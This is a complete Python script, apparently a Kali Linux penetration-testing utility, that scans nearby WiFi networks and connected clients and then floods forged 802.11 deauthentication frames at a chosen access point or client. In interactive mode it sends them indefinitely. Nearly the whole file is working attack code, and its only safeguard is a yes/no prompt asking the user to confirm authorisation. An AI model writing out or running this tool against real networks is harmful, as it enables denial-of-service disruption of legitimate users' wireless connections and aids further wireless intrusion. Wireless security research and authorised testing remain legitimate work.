#!/usr/bin/env python3

"""
WiFi Deauthentication Tool
A command-line utility for Kali Linux designed for cybersecurity research and penetration testing.

MIT License
Copyright (c) 2024 WiFi Deauthentication Tool
See LICENSE file for full license text.
"""

import argparse
import sys
import os
import time
import logging
import netifaces
import subprocess
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored output
init()

class DeauthTool:
    def __init__(self):
        self.interface = None
        self.bssid = None
        self.client = None
        self.num_packets = 50
        self.interval = 0.1
        self.monitor_mode = False
        
        # Setup logging
        self.setup_logging()
        
    def setup_logging(self):
        """Configure logging to both file and console"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f'deauth_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
                logging.StreamHandler()
            ]
        )

    def check_root(self):
        """Check if the script is running with root privileges"""
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] This script must be run as root{Style.RESET_ALL}")
            sys.exit(1)

    def enable_monitor_mode(self):
        """Enable monitor mode on the wireless interface"""
        try:
            os.system(f'airmon-ng check kill')
            os.system(f'airmon-ng start {self.interface}')
            self.monitor_mode = True
            logging.info(f"Enabled monitor mode on {self.interface}")
        except Exception as e:
            logging.error(f"Failed to enable monitor mode: {e}")
            sys.exit(1)

    def disable_monitor_mode(self):
        """Disable monitor mode on the wireless interface"""
        if self.monitor_mode:
            try:
                os.system(f'airmon-ng stop {self.interface}')
                os.system('service NetworkManager start')
                logging.info(f"Disabled monitor mode on {self.interface}")
            except Exception as e:
                logging.error(f"Failed to disable monitor mode: {e}")

    def scan_networks(self):
        """Scan for nearby WiFi networks"""
        print(f"\n{Fore.CYAN}[*] Scanning for networks...{Style.RESET_ALL}")
        
        networks = {}
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                # Extract the BSSID (MAC address of the AP)
                bssid = pkt[Dot11].addr2
                
                # Extract network name (SSID)
                if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].ID == 0:
                    ssid = pkt[Dot11Elt].info.decode('utf-8', errors='replace')
                else:
                    ssid = "Hidden SSID"
                
                # Extract channel
                channel = None
                for element in pkt:
                    if element.haslayer(Dot11Elt) and element[Dot11Elt].ID == 3:
                        channel = ord(element[Dot11Elt].info)
                        break
                
                # Store network info
                if bssid not in networks:
                    networks[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'clients': set()
                    }
        
        try:
            print("[*] Scanning for 30 seconds...")
            sniff(iface=self.interface, prn=packet_handler, timeout=30)
            
            # Print results
            print(f"\n{'BSSID':<20} {'Channel':<10} {'SSID':<32}")
            print("-" * 62)
            
            for bssid, info in networks.items():
                print(f"{bssid:<20} {str(info['channel']):<10} {info['ssid']:<32}")
            
            print(f"\n{Fore.GREEN}[+] Found {len(networks)} networks{Style.RESET_ALL}")
            
        except Exception as e:
            logging.error(f"Error during network scan: {e}")
            print(f"{Fore.RED}[!] Error during scan: {e}{Style.RESET_ALL}")
            
        return networks

    def scan_clients(self):
        """Scan for clients connected to a specific AP"""
        print(f"\n{Fore.CYAN}[*] Scanning for clients...{Style.RESET_ALL}")
        
        if not self.bssid:
            print(f"{Fore.RED}[!] BSSID is required for client scanning{Style.RESET_ALL}")
            return set()
            
        clients = set()
        
        def packet_handler(pkt):
            # Check for data packets
            if pkt.haslayer(Dot11):
                # Check if packet is to/from our target AP
                if pkt.addr2 == self.bssid:
                    if pkt.addr1 != "ff:ff:ff:ff:ff:ff" and pkt.addr1 not in clients:
                        clients.add(pkt.addr1)
                        print(f"{Fore.GREEN}[+] Found client: {pkt.addr1}{Style.RESET_ALL}")
                elif pkt.addr1 == self.bssid:
                    if pkt.addr2 != "ff:ff:ff:ff:ff:ff" and pkt.addr2 not in clients:
                        clients.add(pkt.addr2)
                        print(f"{Fore.GREEN}[+] Found client: {pkt.addr2}{Style.RESET_ALL}")
        
        try:
            print(f"[*] Scanning for clients connected to BSSID: {self.bssid}")
            print("[*] Scanning for 30 seconds...")
            sniff(iface=self.interface, prn=packet_handler, timeout=30)
            
            # Print summary
            print(f"\n{'Client MAC':<20}")
            print("-" * 20)
            for client in clients:
                print(f"{client:<20}")
            
            print(f"\n{Fore.GREEN}[+] Found {len(clients)} clients{Style.RESET_ALL}")
            
        except Exception as e:
            logging.error(f"Error during client scan: {e}")
            print(f"{Fore.RED}[!] Error during scan: {e}{Style.RESET_ALL}")
            
        return clients

    def send_deauth(self):
        """Send deauthentication packets"""
        if not self.bssid:
            print(f"{Fore.RED}[!] BSSID is required for deauth attack{Style.RESET_ALL}")
            return

        # Create deauth packet
        packet = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1="ff:ff:ff:ff:ff:ff" if not self.client else self.client,
            addr2=self.bssid,
            addr3=self.bssid
        ) / Dot11Deauth(reason=7)

        print(f"\n{Fore.YELLOW}[*] Starting deauthentication attack...{Style.RESET_ALL}")
        print(f"[*] Target BSSID: {self.bssid}")
        if self.client:
            print(f"[*] Target Client: {self.client}")
        print(f"[*] Sending {self.num_packets} packets with {self.interval}s interval\n")

        try:
            for i in range(self.num_packets):
                sendp(packet, iface=self.interface, verbose=False)
                print(f"\r{Fore.GREEN}[+] Sent packet {i+1}/{self.num_packets}{Style.RESET_ALL}", end="")
                time.sleep(self.interval)
            print("\n\n[*] Attack completed")
        except Exception as e:
            logging.error(f"Error during deauth attack: {e}")

    def cleanup(self):
        """Cleanup and restore normal operation"""
        self.disable_monitor_mode()
        print(f"\n{Fore.GREEN}[*] Cleanup completed{Style.RESET_ALL}")

class InteractiveDeauth:
    def __init__(self):
        self.interface = None
        self.bssid = None
        self.client = None
        self.num_packets = 50
        self.interval = 0.1
        self.monitor_mode = False
        self.networks = {}
        self.clients = {}
        
    def get_wireless_interfaces(self):
        """Get list of wireless interfaces"""
        interfaces = []
        try:
            # Try using iwconfig to find wireless interfaces
            output = subprocess.check_output(['iwconfig'], stderr=subprocess.STDOUT).decode()
            for line in output.split('\n'):
                if line.startswith(' ') or not line:
                    continue
                interface = line.split()[0]
                if 'no wireless extensions' not in line:
                    interfaces.append(interface)
        except:
            # Fallback to checking all interfaces
            for iface in netifaces.interfaces():
                if iface.startswith(('wlan', 'wifi', 'wl')):
                    interfaces.append(iface)
        return interfaces

    def select_interface(self):
        """Show available interfaces and let user select one"""
        interfaces = self.get_wireless_interfaces()
        
        if not interfaces:
            print(f"{Fore.RED}[!] No wireless interfaces found{Style.RESET_ALL}")
            sys.exit(1)
            
        print(f"\n{Fore.CYAN}Available Wireless Interfaces:{Style.RESET_ALL}")
        for i, iface in enumerate(interfaces, 1):
            print(f"{i}. {iface}")
            
        while True:
            try:
                choice = int(input("\nSelect interface number: "))
                if 1 <= choice <= len(interfaces):
                    self.interface = interfaces[choice-1]
                    break
                else:
                    print("Invalid choice. Please try again.")
            except ValueError:
                print("Please enter a number.")

    def enable_monitor_mode(self):
        """Enable monitor mode on selected interface"""
        try:
            os.system(f'airmon-ng check kill')
            os.system(f'airmon-ng start {self.interface}')
            self.monitor_mode = True
            print(f"{Fore.GREEN}[+] Enabled monitor mode on {self.interface}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to enable monitor mode: {e}{Style.RESET_ALL}")
            sys.exit(1)

    def scan_networks(self):
        """Scan and let user select network"""
        print(f"\n{Fore.CYAN}[*] Scanning for networks...{Style.RESET_ALL}")
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                
                if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].ID == 0:
                    ssid = pkt[Dot11Elt].info.decode('utf-8', errors='replace')
                else:
                    ssid = "Hidden SSID"
                
                # Get signal strength
                try:
                    signal_strength = pkt.dBm_AntSignal
                except:
                    signal_strength = "N/A"
                
                # Get channel
                channel = None
                for element in pkt:
                    if element.haslayer(Dot11Elt) and element[Dot11Elt].ID == 3:
                        channel = ord(element[Dot11Elt].info)
                        break
                
                if bssid not in self.networks:
                    self.networks[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'signal': signal_strength,
                        'clients': set()
                    }
        
        print("[*] Scanning for 30 seconds...")
        sniff(iface=self.interface, prn=packet_handler, timeout=30)
        
        # Display networks
        networks_list = list(self.networks.items())
        print(f"\n{'No.':<4} {'BSSID':<20} {'Channel':<8} {'Signal':<8} {'SSID':<32}")
        print("-" * 72)
        
        for i, (bssid, info) in enumerate(networks_list, 1):
            print(f"{i:<4} {bssid:<20} {str(info['channel']):<8} {str(info['signal']):<8} {info['ssid']:<32}")
        
        # Let user select network
        while True:
            try:
                choice = int(input("\nSelect network number: "))
                if 1 <= choice <= len(networks_list):
                    self.bssid = networks_list[choice-1][0]
                    break
                else:
                    print("Invalid choice. Please try again.")
            except ValueError:
                print("Please enter a number.")

    def scan_clients(self):
        """Scan and let user select client"""
        print(f"\n{Fore.CYAN}[*] Scanning for clients on network: {self.networks[self.bssid]['ssid']}{Style.RESET_ALL}")
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                # Check packets to/from our target AP
                if pkt.addr2 == self.bssid:
                    if pkt.addr1 != "ff:ff:ff:ff:ff:ff":
                        self.clients[pkt.addr1] = self.get_device_info(pkt.addr1)
                elif pkt.addr1 == self.bssid:
                    if pkt.addr2 != "ff:ff:ff:ff:ff:ff":
                        self.clients[pkt.addr2] = self.get_device_info(pkt.addr2)
        
        print("[*] Scanning for 30 seconds...")
        sniff(iface=self.interface, prn=packet_handler, timeout=30)
        
        if not self.clients:
            print(f"{Fore.YELLOW}[!] No clients found{Style.RESET_ALL}")
            return False
            
        # Display clients
        clients_list = list(self.clients.items())
        print(f"\n{'No.':<4} {'Client MAC':<20} {'Device Info':<40}")
        print("-" * 64)
        
        for i, (mac, info) in enumerate(clients_list, 1):
            print(f"{i:<4} {mac:<20} {info:<40}")
        
        # Let user select client
        while True:
            try:
                choice = int(input("\nSelect client number (0 for all clients): "))
                if choice == 0:
                    self.client = None
                    break
                elif 1 <= choice <= len(clients_list):
                    self.client = clients_list[choice-1][0]
                    break
                else:
                    print("Invalid choice. Please try again.")
            except ValueError:
                print("Please enter a number.")
        
        return True

    def get_device_info(self, mac):
        """Try to get device information from MAC address"""
        mac_prefix = mac[:8].upper()
        try:
            # This would be better with a proper MAC vendor database
            # For now, return generic device type based on common prefixes
            if mac_prefix.startswith(('AC:67:B2', '00:11:22')):
                return 'Apple Device'
            elif mac_prefix.startswith(('00:1A:11', '00:26:AB')):
                return 'Android Device'
            elif mac_prefix.startswith(('00:1D:D8', '00:12:17')):
                return 'Windows Device'
            else:
                return 'Unknown Device'
        except:
            return 'Unknown Device'

    def perform_deauth(self):
        """Perform deauthentication attack"""
        target = self.client if self.client else "ff:ff:ff:ff:ff:ff"
        
        # Create deauth packet
        packet = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1=target,
            addr2=self.bssid,
            addr3=self.bssid
        ) / Dot11Deauth(reason=7)
        
        print(f"\n{Fore.YELLOW}[*] Starting deauthentication attack...{Style.RESET_ALL}")
        print(f"[*] Target Network: {self.networks[self.bssid]['ssid']}")
        print(f"[*] Target BSSID: {self.bssid}")
        if self.client:
            print(f"[*] Target Client: {self.client} ({self.clients[self.client]})")
        else:
            print("[*] Target: All Clients")
            
        try:
            while True:
                sendp(packet, iface=self.interface, verbose=False)
                print(f"\r{Fore.GREEN}[+] Sent deauth packet to {target}{Style.RESET_ALL}", end="")
                time.sleep(self.interval)
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Attack interrupted by user{Style.RESET_ALL}")

    def cleanup(self):
        """Cleanup and restore normal operation"""
        if self.monitor_mode:
            try:
                os.system(f'airmon-ng stop {self.interface}')
                os.system('service NetworkManager start')
                print(f"\n{Fore.GREEN}[*] Restored network interface{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error during cleanup: {e}{Style.RESET_ALL}")

    def start_interactive_mode(self):
        """Start interactive deauth session"""
        try:
            # Check root privileges
            if os.geteuid() != 0:
                print(f"{Fore.RED}[!] This script must be run as root{Style.RESET_ALL}")
                sys.exit(1)
            
            # Show disclaimer
            print(f"\n{Fore.RED}[!] WARNING: This tool is for authorized testing only.")
            print(f"[!] By continuing, you confirm you have permission to test the target network.{Style.RESET_ALL}")
            response = input("\nDo you agree? (yes/no): ")
            
            if response.lower() != 'yes':
                print("\nAborted by user.")
                sys.exit(0)
            
            # Start interactive session
            self.select_interface()
            self.enable_monitor_mode()
            self.scan_networks()
            if self.scan_clients():
                self.perform_deauth()
                
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Session interrupted by user{Style.RESET_ALL}")
        finally:
            self.cleanup()

def main():
    parser = argparse.ArgumentParser(description='WiFi Deauthentication Tool')
    parser.add_argument('--interactive', '-i', action='store_true', help='Start interactive mode')
    parser.add_argument('--interface', help='Wireless interface to use')
    parser.add_argument('--scan', '-s', action='store_true', help='Scan for networks')
    parser.add_argument('--bssid', '-b', help='Target AP MAC address')
    parser.add_argument('--client', '-c', help='Target client MAC address')
    parser.add_argument('--packets', '-p', type=int, default=50, help='Number of deauth packets to send')
    parser.add_argument('--interval', type=float, default=0.1, help='Interval between packets in seconds')
    
    args = parser.parse_args()
    
    if args.interactive:
        tool = InteractiveDeauth()
        tool.start_interactive_mode()
    else:
        tool = DeauthTool()
        tool.interface = args.interface
        tool.bssid = args.bssid
        tool.client = args.client
        tool.num_packets = args.packets
        tool.interval = args.interval
        
        # Check root privileges
        tool.check_root()
        
        # Show disclaimer
        print(f"\n{Fore.RED}[!] WARNING: This tool is for authorized testing only.")
        print(f"[!] By continuing, you confirm you have permission to test the target network.{Style.RESET_ALL}")
        response = input("\nDo you agree? (yes/no): ")
        
        if response.lower() != 'yes':
            print("\nAborted by user.")
            sys.exit(0)
            
        try:
            tool.enable_monitor_mode()
            if args.scan:
                tool.scan_networks()
            elif args.bssid:
                if not args.client:
                    tool.scan_clients()
                tool.send_deauth()
            else:
                parser.print_help()
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Attack interrupted by user{Style.RESET_ALL}")
        finally:
            tool.cleanup()

if __name__ == '__main__':
    main() 